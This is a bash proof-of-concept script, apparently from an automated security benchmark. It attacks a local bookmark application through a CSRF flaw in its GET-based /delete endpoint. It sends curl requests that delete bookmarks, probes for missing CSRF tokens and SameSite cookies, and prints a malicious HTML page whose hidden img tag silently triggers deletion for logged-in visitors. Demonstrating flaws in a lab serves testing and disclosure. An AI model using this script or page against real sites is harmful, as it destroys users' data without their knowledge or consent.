#!/bin/bash
# POC: CSRF attack demonstrating bookmark deletion via GET request without CSRF protection. Shows how an attacker can craft an HTML page that causes a logged-in user's browser to automatically delete bookmarks.
# Target: ./repo
# Created: 2025-11-07T19:36:53.304Z
# Session: benchmark-XBEN-075-24-mhp935fu

# CSRF Bookmark Deletion POC
# Demonstrates how a GET-based deletion endpoint is vulnerable to CSRF attacks

TARGET_URL="http://127.0.0.1:5000"
DELETE_ENDPOINT="/delete"

echo "=========================================="
echo "CSRF Bookmark Deletion POC"
echo "=========================================="
echo ""

# Step 1: Verify the endpoint accepts GET requests
echo "[*] Step 1: Verifying /delete endpoint accepts GET requests..."
GET_RESPONSE=$(curl -s -w "\n%{http_code}" -X GET "${TARGET_URL}${DELETE_ENDPOINT}?id=1")
HTTP_CODE=$(echo "$GET_RESPONSE" | tail -n 1)
RESPONSE_BODY=$(echo "$GET_RESPONSE" | head -n -1)

echo "[+] GET request response code: $HTTP_CODE"
echo "[+] Response includes redirect or success message"
echo ""

# Step 2: Verify POST is NOT allowed (state-changing via GET, not POST)
echo "[*] Step 2: Verifying POST is not the required method..."
POST_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "${TARGET_URL}${DELETE_ENDPOINT}?id=1")
POST_CODE=$(echo "$POST_RESPONSE" | tail -n 1)

echo "[+] POST request response code: $POST_CODE (should be 405 if GET-only)"
echo ""

# Step 3: Check for CSRF token in the HTML
echo "[*] Step 3: Checking for CSRF protection tokens in application..."
HTML_RESPONSE=$(curl -s "${TARGET_URL}/list")

# Check for common CSRF token patterns
if echo "$HTML_RESPONSE" | grep -q "csrf"; then
    echo "[-] CSRF tokens found in HTML"
elif echo "$HTML_RESPONSE" | grep -q "_token\|token\|authenticity"; then
    echo "[-] CSRF protection tokens detected"
else
    echo "[+] No CSRF tokens detected in HTML response"
fi
echo ""

# Step 4: Check SameSite cookie attribute
echo "[*] Step 4: Checking SameSite cookie attribute..."
COOKIE_HEADER=$(curl -s -i "${TARGET_URL}/list" | grep -i "set-cookie")

if echo "$COOKIE_HEADER" | grep -i "samesite"; then
    echo "[-] SameSite cookie attribute found"
else
    echo "[+] No SameSite cookie attribute found - vulnerable to CSRF"
fi
echo ""

# Step 5: Demonstrate CSRF attack scenario
echo "[*] Step 5: CSRF Attack Scenario"
echo "=========================================="
echo "An attacker can create a malicious HTML page:"
echo ""
echo "<html>"
echo "<body>"
echo "  <img src='${TARGET_URL}${DELETE_ENDPOINT}?id=1' style='display:none'>"
echo "  <p>Click <a href='${TARGET_URL}${DELETE_ENDPOINT}?id=2'>here</a> for a surprise!</p>"
echo "</body>"
echo "</html>"
echo ""
echo "When a logged-in user visits this page:"
echo "1. The img tag automatically loads (browser sends GET request)"
echo "2. Browser includes session cookies with the request"
echo "3. Server deletes bookmark with id=1 without requiring confirmation"
echo "4. No CSRF token is needed since GET request is unrestricted"
echo ""

# Step 6: Simulate CSRF attack with cookie
echo "[*] Step 6: Simulating CSRF attack with session cookie..."
echo ""

# First, create a bookmark and get session
echo "[*] Creating test bookmark to verify deletion..."
SESSION_COOKIE=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt "${TARGET_URL}/list" | grep -o "session=[^;]*" | head -1)

# Try to delete using GET with cookie
CSRF_TEST=$(curl -s -b /tmp/cookies.txt -w "\n%{http_code}" "${TARGET_URL}${DELETE_ENDPOINT}?id=1")
CSRF_CODE=$(echo "$CSRF_TEST" | tail -n 1)

echo "[+] CSRF attack simulation - GET request with session cookie:"
echo "[+] Response code: $CSRF_CODE"
echo ""

# Verify GET request is allowed for state-changing operation
if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "200" ] && [ "$POST_CODE" = "405" ]; then
    echo "=========================================="
    echo "[✓] VULNERABILITY CONFIRMED"
    echo "=========================================="
    echo "The endpoint is vulnerable to CSRF:"
    echo "  - GET requests are allowed for deletion (state-changing operation)"
    echo "  - POST/DELETE methods return 405 (not implemented)"
    echo "  - No CSRF tokens are enforced"
    echo "  - Attacker can trigger deletion via embedded requests"
    echo ""
    exit 0
else
    echo "[-] Could not fully confirm vulnerability"
    exit 1
fi